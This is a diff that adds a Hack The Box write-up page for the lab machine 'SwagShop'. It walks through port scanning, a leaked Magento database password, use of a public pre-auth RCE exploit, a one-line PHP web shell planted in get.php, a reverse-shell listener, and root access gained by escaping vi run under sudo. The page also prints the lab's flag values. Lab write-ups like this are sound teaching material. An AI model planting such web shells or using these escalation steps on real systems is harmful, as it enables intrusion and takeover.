@@ -1,0 +1,185 @@
+---
+layout: default
+title: SwagShop
+---
+
+<h1>SwagShop</h1>
+<p class="date">28/09/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/swagshop/swagshop.png">
+
+<p><code>SwagShop</code> is an easy box that hosts a vulnerable <code>Magento</code> site used to get a shell. Then, to escalate privileges abuse <code>sudo</code> permissions and escape <code>vi</code> to get root.</p> 
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First, start listing open ports to see we have <code>22/ssh</code> and <code>80/http</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/swagshop# nmap -sV -sC 10.10.10.140
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-12 03:45 EDT
+Nmap scan report for 10.10.10.140
+Host is up (0.077s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home page
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+
+<p>Accessing to port the <code>http</code> webpage it will show us the following <code>Magento</code> site.</p>
+
+<img class="img-fluid" src="/static/img/htb/swagshop/1.png">
+
+<p>Run <code>gobuster</code> to find a bunch of available paths.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/swagshop# gobuster -u http://10.10.10.140/ -w /usr/share/wordlists/dirb/common.txt 
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.140/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/05/12 03:45:29 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/app (Status: 301)
+/downloader (Status: 301)
+/errors (Status: 301)
+/favicon.ico (Status: 200)
+/includes (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/lib (Status: 301)
+/media (Status: 301)
+/pkginfo (Status: 301)
+/server-status (Status: 403)
+/shell (Status: 301)
+/skin (Status: 301)
+/var (Status: 301)
+=====================================================
+2019/05/12 03:46:25 Finished
+=====================================================
+</pre>
+
+<p>On <code>/app</code> we can see directory listing is enabled which allow us to see which files are there.</p>
+
+<img class="img-fluid" src="/static/img/htb/swagshop/2.png">
+
+<p>On <code>/app/etc/local.xml</code> we have this configuration file with some interesting information.</p>
+
+<pre class="prettyprint">
+&lt;default_setup>&lt;connection>&lt;host>localhost&lt;/host>&lt;username>root&lt;/username>&lt;password>fMVWh7bDHpgZkyfqQXreTjU9&lt;/password>&lt;dbname>swagshop&lt;/dbname>&lt;initStatements>SET NAMES utf8&lt;/initStatements>&lt;model>mysql4&lt;/model>&lt;type>pdo_mysql&lt;/type>&lt;pdoType>&lt;/pdoType>&lt;active>1&lt;/active>&lt;/connection>&lt;/default_setup>
+</pre>
+
+<p>Following the content discovery we see we have a <code>Magento connect manager</code> login in <code>/downloader</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/swagshop/3.png">
+
+<p>And a login to the admin panel on <code>/index.php/admin</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/swagshop/4.png">
+
+<p>There's a pre-auth <code>RCE</code> exploit available for this version of Magento available <a href="https://www.exploit-db.com/exploits/37977" target="_blank">here</a>.</p>
+
+<p>Change the following lines to indicate our target website and use whatever username and password we want, the exploit will create a user with those credentials.</p>
+
+<pre class="prettyprint">
+target = "http://10.10.10.140/index.php"
+...
+query = q.replace("\n", "").format(username="qwerty", password="qwerty")
+</pre>
+
+<p>Once the exploit has been executed, we can login with the credentials we used.</p>
+
+<img class="img-fluid" src="/static/img/htb/swagshop/5.png">
+
+<p>Access to <code>System -> Filesystem</code>, edit <code>get.php</code> and add the following line to be able to execute commands.</p>
+
+<pre class="prettyprint">
+shell_exec($_REQUEST['cmd']);
+</pre>
+
+<p>Then run a <code>nc</code> reverse shell to our machine and we get a shell as <code>www-data</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/swagshop# nc -nlvp 6969
+listening on [any] 6969 ...
+connect to [10.10.16.73] from (UNKNOWN) [10.10.10.140] 36384
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+
+<pre class="prettyprint">
+$ cat /home//user.txt
+<span flag="a448877277e82f05e5ddf9f90aefbac8">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>First thing we do is check if this user is able to run commands with <code>sudo</code>.</p>
+
+<pre class="prettyprint">
+$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+</pre>
+
+<p>We can run <code>vi</code> with any file inside <code>/var/www/html/</code>.</p>
+
+<p>We just have to open a file.</p>
+
+<pre class="prettyprint">
+$ sudo /usr/bin/vi /var/www/html/a
+</pre>
+
+<p>And once inside the <code>vi</code> console, execute the following command to escape <code>vi</code> and get a shell.</p>
+
+<pre class="prettyprint">
+:!/bin/sh
+</pre>
+
+<p>Since <code>vi</code> is running with <code>sudo</code>, we get a shell as <code>root</code>.</p>
+
+<pre class="prettyprint">
+id
+uid=0(root) gid=0(root) groups=0(root)
+</pre>
+
+<pre class="prettyprint">
+cat /root/root.txt
+<span flag="c2b087d66e14a652a3b86a130ac56721">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+
+   ___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+</pre>
